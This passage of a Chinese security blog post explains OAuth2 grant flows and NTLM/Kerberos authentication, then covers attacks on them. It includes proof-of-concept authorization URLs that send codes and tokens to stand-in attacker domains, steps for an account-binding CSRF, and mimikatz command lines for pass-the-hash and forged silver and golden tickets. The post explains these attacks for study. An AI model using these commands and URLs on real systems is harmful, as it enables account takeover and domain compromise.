<li>client，客户端，使用资源所有者的授权代表资源所有者发起对受保护资源的请求的应用程序。如：web网站，移动应用等。</li>
<li>authorization server，授权服务器，能够向客户端颁发令牌。</li>
<li>user-agent，用户代理，帮助资源所有者与客户端沟通的工具，一般为 web 浏览器，移动 APP 等。</li>
</ol>
<p>一个客户端想要获得授权，就需要先到服务商那注册你的应用。一般需要你提供下面这些信息：</p>
<ol>
<li>应用名称</li>
<li>应用网站</li>
<li>重定向 URI 或回调 URL（redirect_uri）</li>
</ol>
<p>在发送Oauth请求的时候，我们经称容易在请求头部看到如下几个参数：</p>
<ol>
<li><p><code>client_id</code>客户端标识,这个参数是和客户端一一对应的,这样服务端才知道认证请求来自哪个客户端.例如”101019034”代表的就是新浪微博这个客户端</p>
</li>
<li><p><code>response_type</code>授权类型,上文已经说了OAuth有多种授权类型.此处”code”代表使用的是Authorization Code(授权码模式)</p>
</li>
<li><p><code>scope</code>申请的权限范围</p>
</li>
<li><p><code>redirect_uri</code>重定向URI,用户给予授权后,将会携带授权码跳转到此地址</p>
</li>
<li><p><code>state</code>这个参数是用来防御CSRF的,你可以将其理解为我们常用的”token”.这里它的使用和”token”也是一样的.</p>
</li>
</ol>
<p>每次授权请求,客户端都会生成一个state,并将其保存到cookie或session中.授权成功后,服务端原样返回state,客户端将其与cookie或session中的值进行比对.<br>重定向 URI 是服务商在用户授权（或拒绝）应用程序之后重定向用户的地址，因此也是用于处理授权代码或访问令牌的应用程序的一部分。在你注册成功之后，你会从服务商那获取到你的应用相关的信息：</p>
<ol>
<li>客户端标识 <code>client_id</code></li>
<li>客户端密钥 <code>client_secret</code></li>
</ol>
<p><code>client_id</code> 用来表识客户端（公开），<code>client_secret</code> 用来验证客户端身份（保密）。</p>
<ul>
<li>Oauth2 常见的四种模式</li>
</ul>
<ol>
<li>授权码模式</li>
<li>隐式模式（简化授权码模式）</li>
<li>登陆模式</li>
<li>客户端模式</li>
</ol>
<blockquote>
<p>下面摘录几张rfc文档的ascii图，不打算介绍交互细节，默认读者理解这几种方式。</p>
</blockquote>
<h3 id="授权码模式"><a href="#授权码模式" class="headerlink" title="授权码模式"></a>授权码模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+--------+                               +---------------+</span><br><span class="line">|        |--(A)- Authorization Request -&gt;|   Resource    |</span><br><span class="line">|        |                               |     Owner     |</span><br><span class="line">|        |&lt;-(B)-- Authorization Grant ---|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(C)-- Authorization Grant --&gt;| Authorization |</span><br><span class="line">| Client |                               |     Server    |</span><br><span class="line">|        |&lt;-(D)----- Access Token -------|               |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |</span><br><span class="line">|        |                               +---------------+</span><br><span class="line">|        |--(E)----- Access Token ------&gt;|    Resource   |</span><br><span class="line">|        |                               |     Server    |</span><br><span class="line">|        |&lt;-(F)--- Protected Resource ---|               |</span><br><span class="line">+--------+                               +---------------+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+--------+                                           +---------------+</span><br><span class="line">|        |--(A)------- Authorization Grant ---------&gt;|               |</span><br><span class="line">|        |                                           |               |</span><br><span class="line">|        |&lt;-(B)----------- Access Token -------------|               |</span><br><span class="line">|        |               &amp; Refresh Token             |               |</span><br><span class="line">|        |                                           |               |</span><br><span class="line">|        |                            +----------+   |               |</span><br><span class="line">|        |--(C)---- Access Token ----&gt;|          |   |               |</span><br><span class="line">|        |                            |          |   |               |</span><br><span class="line">|        |&lt;-(D)- Protected Resource --| Resource |   | Authorization |</span><br><span class="line">| Client |                            |  Server  |   |     Server    |</span><br><span class="line">|        |--(E)---- Access Token ----&gt;|          |   |               |</span><br><span class="line">|        |                            |          |   |               |</span><br><span class="line">|        |&lt;-(F)- Invalid Token Error -|          |   |               |</span><br><span class="line">|        |                            +----------+   |               |</span><br><span class="line">|        |                                           |               |</span><br><span class="line">|        |--(G)----------- Refresh Token -----------&gt;|               |</span><br><span class="line">|        |                                           |               |</span><br><span class="line">|        |&lt;-(H)----------- Access Token -------------|               |</span><br><span class="line">+--------+           &amp; Optional Refresh Token        +---------------+</span><br></pre></td></tr></table></figure>
<p>授权码模式oauth模式是现实生活中最常用的的一种模式。<br>一般说来AS是在资源所有方，client就是我们要登陆的服务，resource owner就是我们自己。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| Resource |</span><br><span class="line">|   Owner  |</span><br><span class="line">|          |</span><br><span class="line">+----------+</span><br><span class="line">     ^</span><br><span class="line">     |</span><br><span class="line">    (B)</span><br><span class="line">+----|-----+          Client Identifier      +---------------+</span><br><span class="line">|         -+----(A)-- &amp; Redirection URI ----&gt;|               |</span><br><span class="line">|  User-   |                                 | Authorization |</span><br><span class="line">|  Agent  -+----(B)-- User authenticates ---&gt;|     Server    |</span><br><span class="line">|          |                                 |               |</span><br><span class="line">|         -+----(C)-- Authorization Code ---&lt;|               |</span><br><span class="line">+-|----|---+                                 +---------------+</span><br><span class="line">  |    |                                         ^      v</span><br><span class="line"> (A)  (C)                                        |      |</span><br><span class="line">  |    |                                         |      |</span><br><span class="line">  ^    v                                         |      |</span><br><span class="line">+---------+                                      |      |</span><br><span class="line">|         |&gt;---(D)-- Authorization Code ---------&apos;      |</span><br><span class="line">|  Client |          &amp; Redirection URI                  |</span><br><span class="line">|         |                                             |</span><br><span class="line">|         |&lt;---(E)----- Access Token -------------------&apos;</span><br><span class="line">+---------+       (w/ Optional Refresh Token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                 Authorization Code Flow</span><br></pre></td></tr></table></figure>
<h3 id="简化授权码模式（隐式模式）"><a href="#简化授权码模式（隐式模式）" class="headerlink" title="简化授权码模式（隐式模式）"></a>简化授权码模式（隐式模式）</h3><ol>
<li>简化授权码模式，不生成refresh token。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">| Resource |</span><br><span class="line">|  Owner   |</span><br><span class="line">|          |</span><br><span class="line">+----------+</span><br><span class="line">     ^</span><br><span class="line">     |</span><br><span class="line">    (B)</span><br><span class="line">+----|-----+          Client Identifier     +---------------+</span><br><span class="line">|         -+----(A)-- &amp; Redirection URI ---&gt;|               |</span><br><span class="line">|  User-   |                                | Authorization |</span><br><span class="line">|  Agent  -|----(B)-- User authenticates --&gt;|     Server    |</span><br><span class="line">|          |                                |               |</span><br><span class="line">|          |&lt;---(C)--- Redirection URI ----&lt;|               |</span><br><span class="line">|          |          with Access Token     +---------------+</span><br><span class="line">|          |            in Fragment</span><br><span class="line">|          |                                +---------------+</span><br><span class="line">|          |----(D)--- Redirection URI ----&gt;|   Web-Hosted  |</span><br><span class="line">|          |          without Fragment      |     Client    |</span><br><span class="line">|          |                                |    Resource   |</span><br><span class="line">|     (F)  |&lt;---(E)------- Script ---------&lt;|               |</span><br><span class="line">|          |                                +---------------+</span><br><span class="line">+-|--------+</span><br><span class="line">  |    |</span><br><span class="line"> (A)  (G) Access Token</span><br><span class="line">  |    |</span><br><span class="line">  ^    v</span><br><span class="line">+---------+</span><br><span class="line">|         |</span><br><span class="line">|  Client |</span><br><span class="line">|         |</span><br><span class="line">+---------+</span><br><span class="line">                      Implicit Grant Flow</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="登陆模式"><a href="#登陆模式" class="headerlink" title="登陆模式"></a>登陆模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+----------+</span><br><span class="line">| Resource |</span><br><span class="line">|  Owner   |</span><br><span class="line">|          |</span><br><span class="line">+----------+</span><br><span class="line">     v</span><br><span class="line">     |    Resource Owner</span><br><span class="line">    (A) Password Credentials</span><br><span class="line">     |</span><br><span class="line">     v</span><br><span class="line">+---------+                                  +---------------+</span><br><span class="line">|         |&gt;--(B)---- Resource Owner -------&gt;|               |</span><br><span class="line">|         |         Password Credentials     | Authorization |</span><br><span class="line">| Client  |                                  |     Server    |</span><br><span class="line">|         |&lt;--(C)---- Access Token ---------&lt;|               |</span><br><span class="line">|         |    (w/ Optional Refresh Token)   |               |</span><br><span class="line">+---------+                                  +---------------+</span><br><span class="line"></span><br><span class="line">       Resource Owner Password Credentials Flow</span><br></pre></td></tr></table></figure>
<h3 id="客户端模式"><a href="#客户端模式" class="headerlink" title="客户端模式"></a>客户端模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+---------+                                  +---------------+</span><br><span class="line">|         |                                  |               |</span><br><span class="line">|         |&gt;--(A)- Client Authentication ---&gt;| Authorization |</span><br><span class="line">| Client  |                                  |     Server    |</span><br><span class="line">|         |&lt;--(B)---- Access Token ---------&lt;|               |</span><br><span class="line">|         |                                  |               |</span><br><span class="line">+---------+                                  +---------------+</span><br><span class="line"></span><br><span class="line">                Client Credentials Flow</span><br></pre></td></tr></table></figure>
<h2 id="Oauth安全问题"><a href="#Oauth安全问题" class="headerlink" title="Oauth安全问题"></a>Oauth安全问题</h2><p>谈及Oauth的安全问题，在了解Oauth的认证机制后，可以发现其中access_token，code这两个值是相当关键的，只要我们有办法获取这些值，或者直接劫持用户可以达到攻击效果。下面是目前比较常见的安全问题。  </p>
<ol>
<li>开放的重定向链接模式匹配<br>我们试想客户端在授权开放平台注册的重定向URI不是完全确定的，如<code>&quot;https://*.somesite.example/*&quot;</code>,<code>https://client.somesite.example/param?*</code>。针对这两种注册方式，是完全有可能绕过的下面给出绕过的poc（假设client_id = 123456）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">针对第一种注册重定向链接的模式：接管了其子域名的情况下，我们可以构造如下url诱使客户端访问。但是一般情况下，还需要client_secret，隐式模式下完全信任客户端就不再需要client_secret获取code，而是直接获取access token。</span><br><span class="line">http://server.somesite.example/authorize?response_type=code&amp;client_id=123456&amp;state=xyz&amp;redirect_uri=https%3A%2F%2Fevil.somesite.example%2Fcb HTTP/1.1</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">针对第二种注册重定向链接的模式，在客户端存在可控的重定向参数(这里是redirect_to)的情况下，如果Oauth采取隐式模式，我们可以直接将access_token引流至我们服务器</span><br><span class="line">http://server.somesite.example/authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https%3A%2F%2Fclient.somesite.example%2Fcb%26redirect_to%253Dhttps%253A%252F%252Fclient.evil.example%252Fcb HTTP/1.1</span><br></pre></td></tr></table></figure>
<ol>
<li><p>认证流混淆<br>这其实有点类似于中间人劫持，并且要求的条件比较苛刻，要想实现这种攻击需要满足三个条件：<br>（1）隐式或授权代码授权被用于多个AS（这里先假设两个），其中一个被认为是“真实的”(H-AS)，另一个由攻击者操作(A-AS)，<br>（2）客户端将用户选择的AS存储在绑定到用户浏览器的会话中，并对这两个AS和使用相同的重定向URI，<br>（3）攻击者可以操作从用户浏览器到客户端的第一个请求/响应对(其中用户选择某个AS，然后由客户端重定向到该AS)。</p>
</li>
<li><p>认证信息泄露（access token，state，code……）<br>其实这种攻击和普通的xss类似，只不过将<code>document.cookie</code>向量换成<code>window.location.href</code>，或者通过嵌入iframe的方式，让认证信息外泄。或者直接在服务端泄露access_token等。</p>
</li>
<li><p>浏览器访问历史记录<br>一般的Oauth实现中，由于涉及浏览器的重定向，参数一般都是直接放在url上，基于这一特性，如果有办法直接接触浏览器的历史记录，也是一个不错的方法。不过这种手段有一个局限性，那就Oauth一般有expire或者放重放机制，如果时效性或者防重放做得不好，或者使用了隐式模式也会带来危害。</p>
</li>
<li><p>redirect_url 重定向漏洞<br>如果服务器在用户输入的redirect_url参数上没有做过滤，就会存在重定向漏洞，结合csrf，可以让重定向漏洞为csrf或者xss提供跳板。或者直接输入attack控制的域名，在refer头部获取token。注意到在授权码模式下，redirect_url的处理出现在AS和client端，所以这两个地方都需要对redirect_url进行校验过滤，第一处攻击可以获得token，利用获得的token，第二次就可以获得access_token。</p>
</li>
<li><p>不安全的Oauth认证会话<br>用户在授权的时候需要先认证，如果AS在授权完毕后不主动注销登陆会话，就会产生会话溢出。在用户登出请求授权的client后，AS处用户的登陆态仍旧保持，那么如果浏览器被人控制的话，可以直接获取这一开启的会话。</p>
</li>
<li><p>账号关联功能CSRF<br>试想一种攻击场景，比如攻击者在一个网站关联QQ号，那么它截获最后返回access_token时候的数据包，把这个请求作为payload诱使victim访问，在victim登陆了网站的前提下，会自动将账号和攻击者的qq账号关联。</p>
</li>
</ol>
<p>Step 1. 攻击者李四登录Tonr网站，并且选择绑定自己的Sparklr账号。<br>Step 2. Tonr网站将李四重定向到Sparklr，由于他之前已经登录过Sparklr，所以Sparklr直接向他显示“是否授权Tonr访问”的页面。<br>Step 3. 李四在点击”同意授权“之后，截获Sparklr服务器返回的含有Authorization Code参数的HTTP响应。<br>Step 4. 李四精心构造一个Web页面，它会触发Tonr网站向Sparklr发起令牌申请的请求，而这个请求中的Authorization Code参数正是上一步截获到的code。<br>Step 5. 李四将这个Web页面放到互联网上，等待或者诱骗受害者张三来访问。<br>Step 6. 张三之前登录了Tonr网站，只是没有把自己的账号和其他社交账号绑定起来。在张三访问了李四准备的这个Web页面后，令牌申请流程在张三的浏览器里被顺利触发，Tonr网站从Sparklr那里获取到access_token，但是这个token以及通过它进一步获取到的用户信息却都是攻击者李四的。<br>Step 7. Tonr网站将李四的Sparklr账号同张三的Tonr账号关联绑定起来，从此以后，李四就可以用自己的Sparklr账号通过OAuth登录到张三在Tonr网站中的账号，堂而皇之的冒充张三的身份执行各种操作。</p>
<blockquote>
<p>以上过程内容节选自：<a href="https://insights.thoughtworks.cn/attack-aim-at-oauth2/" target="_blank" rel="noopener">https://insights.thoughtworks.cn/attack-aim-at-oauth2/</a></p>
</blockquote>
<p><img src="/myimages/认证技术/csrf.png" alt="image"></p>
<h1 id="windows-认证"><a href="#windows-认证" class="headerlink" title="windows 认证"></a>windows 认证</h1><p>windows上的认证大致可以分为两种，一是没有加入kerberos的工作组概念的基于NTLM协议的认证，二是windows域环境的下的认证。</p>
<h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2><p><img src="/myimages/认证技术/ntlm-auth.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一步,首先在client输入username,password和domain,然后client会把password hash后的值先缓存到本地</span><br><span class="line">第二步,之后,client把username的明文发送给server(DC)</span><br><span class="line">第三步,DC会生成一个16字节的随机数,即challenge(挑战码),再传回给client</span><br><span class="line">第四步,当client收到challenge以后,会先复制一份出来,然后和缓存中的密码hash再一同混合hash一次,混合后的值称为response,之后client再将challenge,response及username一并都传给server</span><br><span class="line">第五步,server端在收到client传过来的这三个值以后会把它们都转发给DC</span><br><span class="line">第六步,当DC接到过来的这三个值的以后,会根据username到域控的账号数据库(ntds.dit)里面找到该username对应的hash,然后把这个hash拿出来和传过来的challenge值再混合hash</span><br><span class="line">第七步,将(6)中混合后的hash值跟传来的response进行比较,相同则认证成功,反之,则失败,当然,如果是本地登录,所有验证肯定也全部都直接在本地进行了</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到，在这个认证中，使用到明文密码的地方只有用户登陆的时候，后面使用到的全是密码hash，这样一来就产生了一个安全问题，PTH（Pass The Hash），只要我们拿到了密码hash值就可以直接模拟用户登陆。</p>
<p>注意到NTLM时基于挑战的认证协议，在认证前，DC必须有用户密码hash的存储，否则时不可能在第七部解密成功。当然，上面的场景是比较贴近域的概念，使用了中心DC来存储用户的密码hash并且做挑战校验，有一点SSO单点的登陆的意思，但是仔细看会发现少了ticket的概念，后面会发现域认证是SSO单点登陆的一种具体实现。不过其实很多时候，DC和Server是同一台机器，协议流程和上面一致。</p>
<h2 id="kerberos认证"><a href="#kerberos认证" class="headerlink" title="kerberos认证"></a>kerberos认证</h2><p>理解kerberos认证之前还是先来了解一下相关概念：</p>
<ul>
<li>KDC: Key Distribution Center，包括三大块（KAS，TGS，密码hash数据）</li>
<li>KAS：Kerberos Authentication Service，负责用户认证并签发TGT</li>
<li>TGS: Ticket Granting Service，负责认证TGT并签发服务票据ST</li>
<li>TGT: Ticket Granting Ticket，包括用户相关信息和Logon Session Key(确保该用户和KDC之间通信安全的会话秘钥)，标识认证已完成</li>
<li>ST:  Service Ticket，服务票据，用来访问相关服务，标识服务已授权。ST主要包含两方面的内容：客户端用户信息和Service Session Key(保客户端-服务器之间通信安全的会话秘钥)，并通过被请求服务的服务器密钥加密。</li>
</ul>
<p><img src="/myimages/认证技术/kerbos.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1)首先,客户端(client)将域用户的密码hash一次并保存,然后,以此hash来作为客户端和KDC之间的长期共享密钥[kc](当然,在DC上也保存着同样的一条hash)</span><br><span class="line">2)KRB_AS_REQ：客户端(client)开始利用(1)中的域用户密码hash再把时间戳,clientid,TGS id等信息混合hash一次,然后向as(认证服务器 [Authentication Server])服务器进行请求</span><br><span class="line">3)KRB_AS_REP：AS接到该请求后,利用长期共享密钥(kc)进行解密,解密成功后,会返回给客户端两个票据</span><br><span class="line">  (1)加密的K(c,tgs)(用于客户端后续向KDC发起请求),其中c=(TGS Name/ID,时间戳等),该票据由Kc加密</span><br><span class="line">  (2)票据授予票据(Ticket Granting Ticket,简称TGT),该票据是给TGS的,票据的内容包括K(c,tgs),其中c=(Client身份信息,域名,时间戳等),该票据由TGS的秘钥加密,只有TGS能够解密</span><br><span class="line">4)KRB_TGS_REQ：客户端会利用长期共享密钥解密k(c,tgs),并利用该秘钥加密生成一个Authenticator,其中c=(lifetime,时间戳,Client身份信息等),连同从AS获取的TGT一并发送给TGS</span><br><span class="line">5)KRB_TGS_REPTGS：TGS利用自身的秘钥解密TGT,获取K(c,tgs),并用K(c,tgs)解密客户端发送的Authenticator,对Client进行认证,如果Client通过了认证,TGS随机生成一个Session Key K(c,s),并产生两个票据</span><br><span class="line">  (1)服务票据(Ts):这是给服务器的服务票据,由Server秘钥Ks加密,内容包括：K(c,tags),其中c=(Client身份信息,Service ID,时间戳,lifetime等)</span><br><span class="line">  (2)客户端票据(Tc)：该票据由K(c,tgs)加密，其中c=(K(c,s),Server身份信息等)</span><br><span class="line">6)KRB_AP_REQ：客户端收到tgs的回应后,利用K(c,tgs)解密Tc,获取K(c,s),Server身份信息等,并利用K(c,s)加密生成一个Authenticator发送给Server,内容包括:时间戳,Client ID等信息,连同Ts一并发送给Server</span><br><span class="line">7)KRB_AP_REP：Server端在收到Client的请求后,利用自身秘钥Ks解密Ts,得到K(c,s),再利用K(c,s)解密Authenticator,对Client进行认证,如果认证通过,则表示KDC已经允许了此次通信,此时Sever无需与KDC通信,因为Ks为KDC和Sever之间的长期共享秘钥,如果在有效时间内,则此次请求有效。</span><br></pre></td></tr></table></figure>
<h2 id="关于windows认证存在的攻击方式"><a href="#关于windows认证存在的攻击方式" class="headerlink" title="关于windows认证存在的攻击方式"></a>关于windows认证存在的攻击方式</h2><p>通过对上述认证流程的理解，我们可以归纳出windows的域认证有以下几个敏感的特性：</p>
<ul>
<li>NTLM认证中只用到用户密码hash</li>
<li>kerberos用户的密码一般很少更改</li>
<li>只要知道kerberos 用户hash就可以签发TGT</li>
<li>只要知道提供服务的主机密码hash，就可以签发ST</li>
<li>客户端可以随意询问特定服务的TGT</li>
<li>域内的主机都能查询SPN（服务标识符）<br>基于上面说到几个敏感特性，催生了一些域渗透攻击手段。</li>
</ul>
<h3 id="PTH（Pass-The-Hash）"><a href="#PTH（Pass-The-Hash）" class="headerlink" title="PTH（Pass The Hash）"></a>PTH（Pass The Hash）</h3><p>通过上面对windows认证相关的了解，我们可以知道在默认的工作组环境中，以密码hash作为秘密，通过challenge机制作为校验通过的依据，所以认证的整个过程，我们只需要知道用户hash，就可以根据协议流程实现特定用户的登陆。</p>
<blockquote>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:xxx /ntlm:xxx&apos;s ntlm hash /domain:xxx /run:cmd.exe</span><br></pre></td></tr></table></figure>
<h3 id="PTT（Pass-The-Ticket）"><a href="#PTT（Pass-The-Ticket）" class="headerlink" title="PTT（Pass The Ticket）"></a>PTT（Pass The Ticket）</h3><p>PTT攻击是基于上述kerberos认证协议，大致分为白银票据和黄金票据两种票据伪造攻击形式。  </p>
<p>白银票据：知道了服务主机的ntlm hash我们可以伪造ST，构造KRB_AP_REQ请求过程，让服务端相信我们的ST是从KDC获取的，其实我们是通过其NTLM hash自己生成的，也即我给我自己颁发了一个合法的ST。</p>
<p>黄金票据：同样的，如果我们有能力获取到kerberos用户的密码hash，那么我们就可以拥有KDC绝对的权力，比如我们可以给自己签发高权限的TGT，然后利用构造KRB_TGS_REQ请求包获取任意服务的ST。</p>
<blockquote>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 白银票据</span><br><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit</span><br><span class="line"></span><br><span class="line"># 黄金票据</span><br><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit</span><br></pre></td></tr></table></figure>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>微软在Windows平台上的Kerberos并没有采用MIT的实现，而是对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（Privilege Attribute Certificate），特权属性证书，主要目的就是用来实现权限的ACL。正是PAC这的加入，开发对kerberos的实现就出了岔子。可以造成在客户端KRB_AS_REP步骤中，修改PAC从而获得域控权限的TGT。</p>
<blockquote>
<p>具体原理建议移步这篇文章： <a href="https://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/56081.html</a><br>  微软漏洞申明：<a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 域控上获取补丁修复信息</span><br><span class="line">systeminfo | findstr /i kb3011780</span><br></pre></td></tr></table></figure>
<p>通过上述的手段如果发现域控没有安装这一补丁，内网渗透的路子就会明朗开来，现在已经有不少exe，或者脚本，甚至在msf里面也有了利用集成。</p>
<blockquote>
<p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek" target="_blank" rel="noopener">Python Script</a><br>  <a href="https://blog.rapid7.com/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit/" target="_blank" rel="noopener">Msf Payload</a>  </p>
</blockquote>
<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>祭出三号学生前辈的文章，写得已经十分详细了，这里直接挂个链接。</p>
<blockquote>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/</a></p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://tools.ietf.org/html/rfc7522" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7522</a><br>[2] <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6749</a><br>[3] <a href="https://tools.ietf.org/id/draft-ietf-oauth-security-topics-06.html" target="_blank" rel="noopener">https://tools.ietf.org/id/draft-ietf-oauth-security-topics-06.html</a><br>[4] <a href="https://duo.com/blog/the-beer-drinkers-guide-to-saml" target="_blank" rel="noopener">https://duo.com/blog/the-beer-drinkers-guide-to-saml</a><br>[5] <a href="http://avfisher.win/archives/tag/saml" target="_blank" rel="noopener">http://avfisher.win/archives/tag/saml</a><br>[6] <a href="http://blog.intothesymmetry.com/2015/12/top-10-oauth-2-implementation.html" target="_blank" rel="noopener">http://blog.intothesymmetry.com/2015/12/top-10-oauth-2-implementation.html</a><br>[7] <a href="https://ldapwiki.com/wiki/OAuth%202.0%20Vulnerabilities" target="_blank" rel="noopener">https://ldapwiki.com/wiki/OAuth%202.0%20Vulnerabilities</a><br>[8] <a href="https://www.sans.org/reading-room/whitepapers/application/attacks-oauth-secure-oauth-implementation-33644" target="_blank" rel="noopener">https://www.sans.org/reading-room/whitepapers/application/attacks-oauth-secure-oauth-implementation-33644</a><br>[9] <a href="https://xz.aliyun.com/t/2445" target="_blank" rel="noopener">https://xz.aliyun.com/t/2445</a>  </p>

      
    </div>

    <div>
      
        

      
    </div>
	<div>
      
      <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>
	  
	</div>

    <div>
      
        

      
    </div>

    <div>
      
        

<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文标题:</strong>
    <a href="/2019/04/21/认证琐碎/">认证琐碎</a>
